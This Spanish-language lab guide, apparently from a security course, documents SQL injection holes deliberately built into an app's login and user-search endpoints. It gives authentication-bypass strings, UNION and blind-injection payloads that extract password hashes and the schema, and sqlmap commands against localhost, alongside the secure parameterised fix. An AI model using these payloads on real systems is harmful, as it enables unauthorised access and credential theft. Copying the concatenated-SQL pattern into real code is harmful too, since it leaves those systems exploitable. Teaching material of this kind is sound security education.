# ⚠️ VULNERABILIDADES SQL INJECTION - FINES EDUCATIVOS ⚠️

## ⚠️ ADVERTENCIA IMPORTANTE ⚠️

Este documento describe vulnerabilidades **INTENCIONALMENTE** introducidas en el sistema para fines educativos en la materia de seguridad. **NUNCA** implementes estas técnicas en sistemas de producción.

## 📍 Vulnerabilidades Introducidas

### 1. Login Vulnerable (`/api/login-vulnerable`)

**Archivos modificados:**

- `database.js` - Método `findUserByUsernameVulnerable()`
- `server.js` - Endpoint `/api/login-vulnerable`

**Vulnerabilidades:**

- ❌ Sin parámetros preparados (prepared statements)
- ❌ Concatenación directa de strings en SQL
- ❌ Sin validación de entrada
- ❌ Sin rate limiting específico
- ❌ Información detallada de errores SQL expuesta

**Consulta vulnerable:**

```sql
SELECT * FROM users
WHERE username = '${username}'
AND password = '${password}'
AND is_active = 1
```

### 2. Búsqueda Vulnerable (`/api/users-vulnerable`)

**Vulnerabilidades:**

- ❌ Inyección en cláusula ORDER BY
- ❌ Sin escape de caracteres especiales
- ❌ Sin validación de parámetros de ordenamiento

**Consulta vulnerable:**

```sql
SELECT id, username, role, email, first_name, last_name,
       is_active, last_login, created_at
FROM users
ORDER BY ${orderBy}
```

## 🎯 Ejemplos de Inyección SQL

### Bypass de Autenticación

#### Ejemplo 1: OR condition

- **Usuario:** `admin' OR '1'='1' --`
- **Contraseña:** `cualquier_cosa`
- **Resultado:** La consulta se convierte en:

```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1' --'
AND password = 'cualquier_cosa'
AND is_active = 1
```

#### Ejemplo 2: Simple OR

- **Usuario:** `' OR 1=1 --`
- **Contraseña:** `(vacío)`
- **Resultado:** Bypassa completamente la autenticación

### Union-Based SQL Injection

#### Obtener contraseñas (en búsqueda)

- **ORDER BY:** `1 UNION SELECT password,username,1,1,1,1,1,1,1 FROM users --`
- **Resultado:** Expone las contraseñas hasheadas junto con los usernames

#### Obtener estructura de la base de datos

- **ORDER BY:** `1 UNION SELECT name,sql,1,1,1,1,1,1,1 FROM sqlite_master WHERE type='table' --`
- **Resultado:** Muestra la estructura completa de las tablas

#### Obtener información del sistema

- **ORDER BY:** `1 UNION SELECT sqlite_version(),1,1,1,1,1,1,1,1 --`
- **Resultado:** Obtiene la versión de SQLite

### Boolean-Based Blind SQL Injection

#### Verificar existencia de tablas

- **ORDER BY:** `(CASE WHEN EXISTS(SELECT name FROM sqlite_master WHERE type='table' AND name='users') THEN username ELSE 'zzz' END)`

#### Extraer datos carácter por carácter

- **ORDER BY:** `(CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='$' THEN username ELSE 'zzz' END)`

### Time-Based Blind SQL Injection (SQLite limitado)

SQLite tiene capacidades limitadas para time-based injection, pero se puede intentar:

- **ORDER BY:** `(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM (SELECT 1 FROM users LIMIT 10000)) ELSE username END)`

## 🛠️ Cómo Probar las Vulnerabilidades

### 1. Activar Modo Vulnerable

1. Abre la aplicación web
2. Marca la casilla "Usar login vulnerable (para testing de SQL injection)"
3. Los ejemplos de inyección SQL aparecerán automáticamente

### 2. Probar Login Bypass

1. Usa cualquiera de los ejemplos de bypass de autenticación
2. Observa los logs en la consola del navegador y del servidor
3. Verifica que puedas acceder sin credenciales válidas

### 3. Probar Union-Based Injection

1. Accede al sistema (con login normal o vulnerable)
2. Ve a la sección de usuarios
3. En el campo "Testing SQL Injection en ORDER BY" prueba las consultas UNION
4. Observa los resultados en la tabla y consola

## 🔒 Medidas de Protección Implementadas (Solo en modo seguro)

### Login Seguro (`/api/login`)

- ✅ Parámetros preparados (prepared statements)
- ✅ Hash bcrypt para contraseñas
- ✅ Rate limiting
- ✅ Validación con Joi
- ✅ Manejo seguro de errores
- ✅ Headers de seguridad con Helmet

### Código Seguro vs Vulnerable

#### ❌ VULNERABLE (NO usar en producción):

```javascript
const sql = `SELECT * FROM users WHERE username = '${username}'`;
```

#### ✅ SEGURO:

```javascript
const sql = `SELECT * FROM users WHERE username = ?`;
this.db.get(sql, [username], callback);
```

## 📚 Recursos Educativos

### Herramientas para Análisis

- **SQLMap**: Herramienta automática para detectar SQL injection
- **Burp Suite**: Proxy para interceptar y modificar requests
- **OWASP ZAP**: Scanner de vulnerabilidades web

### Comandos SQLMap de ejemplo:

```bash
# Detectar SQL injection en login
sqlmap -u "http://localhost:3000/api/login-vulnerable" --data="username=test&password=test" --method=POST

# Enumerar bases de datos
sqlmap -u "http://localhost:3000/api/users-vulnerable?order=id" --dbs

# Extraer datos de tabla users
sqlmap -u "http://localhost:3000/api/users-vulnerable?order=id" --dump -T users
```

## 🎓 Objetivos de Aprendizaje

1. **Identificar** código vulnerable a SQL injection
2. **Explotar** diferentes tipos de inyección SQL
3. **Entender** el impacto de las vulnerabilidades
4. **Implementar** medidas de protección efectivas
5. **Reconocer** patrones de código inseguro

## ⚖️ Consideraciones Éticas

- Este código es **SOLO** para fines educativos
- **NO** uses estas técnicas en sistemas que no te pertenecen
- Siempre obtén **autorización explícita** antes de hacer pruebas de seguridad
- Reporta vulnerabilidades de manera **responsable**

## 📞 Referencias

- [OWASP SQL Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLite Documentation](https://www.sqlite.org/lang.html)

---

**Recuerda:** El objetivo es **aprender** sobre seguridad para **construir** sistemas más seguros, no para atacar sistemas existentes.
